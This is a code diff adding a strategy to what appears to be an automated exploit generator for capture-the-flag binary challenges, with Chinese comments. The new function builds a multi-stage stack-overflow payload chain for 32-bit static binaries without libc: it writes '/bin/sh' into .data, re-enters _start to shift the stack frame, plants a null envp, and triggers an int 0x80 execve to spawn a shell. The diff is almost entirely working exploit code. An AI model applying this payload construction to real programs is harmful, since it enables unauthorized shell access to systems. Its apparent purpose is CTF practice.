@@ -153,6 +153,65 @@ def s_ret2win(ch: Challenge, f: Facts) -> Iterable[Plan]:
                            f"jump to {win.evidence} @ {hex(win.addr)} off={off} align={int(align)}")
 
 
+# --------------------------------------------------------------------------- 0. 纯 int 0x80（无 libc）三段式
+def s_syscall_execve(ch: Challenge, f: Facts) -> Iterable[Plan]:
+    """没有 libc、只有自写 syscall 包装的极小静态二进制（0CTF 2016 welcome 那类）。
+
+    硬约束（三者同时成立才出手，否则 return）：
+      * 只有 read/write/exit 这类包装，代码里没有 mov eax,11
+      * 溢出窗口刚好「返回地址 + 4 个 dword」，也就是 limit == offset + 0x14
+        —— 直接 read(返回 11)->int80 会让栈帧右移 4 字节，envp 槽位正好掉出窗口
+      * .data 可写（不可执行），_start 开头有 sub esp,imm 可用来把帧整体下移
+
+    绕过方式：先把 0 种在「下一段窗口外一格」，再重入 _start 让帧下移 imm，
+    于是下一段里 execve 的 envp 槽位读到的就是这个 0。
+    """
+    if ch.elf.bits != 32:
+        return
+    if not (f.sys_read and f.sys_load and f.data_addr and f.entry_sub):
+        return
+    v = next((x for x in f.vulns if x.sink == "read" and x.offset and x.size_limit), None)
+    if not v or not v.func_entry:
+        return
+    off, limit = v.offset, v.size_limit
+    if limit != off + 0x14:
+        return                      # 不是「正好差一个 dword」的题型，交给别的策略
+
+    data = f.data_addr
+    argv_ptr = data + 8             # 这 8 字节会被 "/bin/sh\0" 覆盖，之后是 0
+    plant = off + 0x14 - f.entry_sub
+    if not (0 <= plant + 4 <= limit):
+        return
+
+    def stage(target: int, ra: int, a1: int = 0, a2: int = 0, a3: int = 0) -> bytes:
+        buf = bytearray(b"A" * limit)
+        buf[off:off + 4] = ch.p32(target)
+        pos = off + 4
+        for val in (ra, a1, a2, a3):
+            if pos + 4 <= limit:
+                buf[pos:pos + 4] = ch.p32(val)
+            pos += 4
+        return bytes(buf)
+
+    # A：把 "/bin/sh\0" 写进 .data，再回漏洞函数继续读
+    s1 = stage(f.sys_read, v.func_entry, 0, data, limit)
+    blob = b"/bin/sh\x00".ljust(limit, b"\x00")
+
+    # B：把 0 种到「下一段窗口外一格」，然后重入 _start 让帧下移
+    s2 = bytearray(b"A" * limit)
+    s2[off:off + 4] = ch.p32(ch.elf.entry)
+    s2[plant:plant + 4] = ch.p32(0)
+    s2 = bytes(s2)
+
+    # C：read 只喂 11 字节 -> 返回 11 -> eax=11；紧跟装载块做 execve
+    s3 = stage(f.sys_read, f.sys_load, 0, data, argv_ptr)
+    s4 = b"/bin/sh\x00\x00\x00\x00"
+
+    yield Plan("syscall3", [s1, blob, s2, s3, s4],
+               f"int80 execve: data={hex(data)} off={off} plant={plant} "
+               f"entry_sub={hex(f.entry_sub)}")
+
+
 # --------------------------------------------------------------------------- 1a. ret2win(PIE 局部覆盖)
 def s_ret2win_pie(ch: Challenge, f: Facts) -> Iterable[Plan]:
     """PIE + 无泄漏：只覆盖返回地址的低 1~2 字节，跳到同一页/同一 64K 内的 win 函数。
@@ -631,6 +690,7 @@ def _writable(ch: Challenge) -> Optional[int]:
 
 
 STRATEGIES = [
+    s_syscall_execve,
     s_ret2win_pie,
     s_ret2win,
     s_ret2plt,
